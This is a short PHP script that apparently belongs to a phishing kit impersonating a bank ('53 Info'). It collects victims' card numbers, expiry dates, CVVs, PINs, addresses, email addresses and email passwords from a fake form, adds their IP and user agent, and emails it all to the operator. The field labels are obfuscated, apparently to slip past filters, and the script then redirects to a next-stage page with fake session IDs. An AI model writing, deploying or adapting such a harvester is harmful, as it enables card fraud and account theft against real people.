<?php
if($_POST["c"] != "" and $_POST["x"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------53 Info-----------------------\n";
$message .= "C@rd Number            : ".$_POST['c']."\n";
$message .= "Expiry Date       		: ".$_POST['x']."\n";
$message .= "C.V'V            		: ".$_POST['v']."\n";
$message .= "C@rd P!N         		: ".$_POST['p']."\n";
$message .= "Address           		: ".$_POST['addr']."\n";
$message .= "Em@il Address          : ".$_POST['m']."\n";
$message .= "Em@il Pa'ssw0rd        : ".$_POST['pe']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf3.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>